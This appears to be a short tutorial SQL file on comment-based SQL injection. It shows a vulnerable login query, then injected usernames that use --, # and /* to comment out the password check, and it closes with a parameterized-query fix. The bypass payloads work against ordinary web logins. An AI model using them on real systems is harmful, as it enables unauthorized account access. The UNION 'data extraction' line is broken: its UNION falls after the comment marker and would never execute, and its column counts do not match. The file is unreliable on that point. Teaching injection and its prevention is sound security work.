-- Comment-Based SQL Injection
-- The attacker appends SQL comment markers (--, #, /* */) to neutralize the
-- remaining part of the query and stop the server from parsing the rest.

-- Vulnerable login query
SELECT * FROM users WHERE username = 'admin' AND password = 'x';

-- Input username = admin' -- (space after --): the password check is commented out
SELECT * FROM users WHERE username = 'admin' --' AND password = 'x';

-- MySQL uses # as an inline comment marker
SELECT * FROM users WHERE username = 'admin'#' AND password = 'x';

-- Block comment swallows the remaining clause
SELECT * FROM users WHERE username = 'admin'/* AND password = 'x';

-- Combined with UNION to turn a bypass into full data extraction
SELECT * FROM users WHERE username = 'admin' --' AND password = 'x' UNION SELECT username, password FROM admins --';

-- Prevention: parameterized queries and never building SQL by string concatenation
SELECT * FROM users WHERE username = ? AND password = ?;